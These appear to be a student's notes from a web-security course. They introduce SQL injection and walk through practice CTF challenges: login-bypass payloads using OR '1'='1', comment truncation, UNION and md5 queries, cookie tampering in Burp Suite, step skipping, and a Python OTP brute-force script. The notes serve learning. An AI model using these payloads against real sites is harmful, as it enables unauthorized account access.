# SQL Injection

## Part 1 - Review
* Client   | Web - WAS - DB
* Web Browser
Front End (user / HTML,CSS,Javascript)  ----  Back end (server / ASP, JSP, PHP, Python)
* Web server : file
  - cookie = post-it
  - Session | SessionID
* Identification / Authentication
* Burp Suite - Web Proxy tool

## Part 2 - SQL Injection
* A code injection technique that might destroy your database
* SQL Example   
  - select * from member where id='normalitic'   =  All data
  - select id,pass from member where id='normalitic'   =  ID, Password

* SQL Injection Example
  - ID -> normaltic' #
  - '#' = comment
  - ID -> normaltic' or '1'='1
  - where id ='normaltic' or '1'='1' and pass = '99'
  - "and" function works first

## Part 3 - CTF
* CTF Resource
* https://book.hacktricks.xyz/pentesting-web/login-bypass
* https://portswigger.net/web-security/sql-injection/union-attacks
* https://www.geeksforgeeks.org/sql-limit-clause/
* https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#ByPassingLoginScreens

## Part 4 - Assignment
1. Review
2. CTF <br>
a. Login Bypass 1
- Check whether the SQL injection working or not
- normaltic1' or '1'='1
- Assume the identification and authentication together

b. Login Bypass 2
- normaltic1' #
- Assume the identification and authentication together with hash? or not

c. Login Bypass 3
- Assume the identification and authentication separate because of not working of the last SQL injection
- I need to find where the password location. It can be used by UNION
- Check the UNION table how many tables is located in  (doldol' order by 1#)
- Use the UNION (SELECT a, b FROM table1 UNION SELECT c, d FROM table2)
- ID = ' union select 'normaltic3', '0000' #  // Password 0000

d. Login Bypass 4
- Assume the identification and authentication separate with hash
- Use the UNION and Hash (md5)
- ID = ' union select 'normaltic4', md5('0000') #  // Password 0000

e. Login Bypass 5
- Read burp suite and we can see the cookiee session and loginUser = doldol
- we can change the loginuser to normaltic5 on repeater and send it.

f. Secret Login
- The hint said to login as an admin, but they forgot the admin account.
- So, try the basic SQL Injection to check login logic condition
- Use the limit function of SQL Injection to bring specific row information
- ID = ' or '1'='1' limit 1,1 #

g. Get Admin
- At the Burpsuite, the login function uses a cookies session.
- Change the loginUser to Admin

h. PIN CODE Bypass
- Brute Force: Random input
- Page is changed sequence
- So, Change the step2.php to step3.php

i. Admin is Mine
- There is no clue for SQL injection, so it should use intercept loginUser
- The setting of proxy seeting changes to Intercept responses based on the following rules "check"
- Match type Request "Check"
- After that, follow the traffic and change the id to admin

j. Pin Code Crack
- Brute Force to use Python
```python
import requests

URL = "http://ctf.segfaulthub.com:1129/6/checkOTP.php"

for i in range(10000):
    res = requests.get(URL, params={'otpNum': i})
    if "Fail" not in res.text:
        print(f"otpNum = {i}")
        break
```
3. Web Development
- Login page
- Create Account
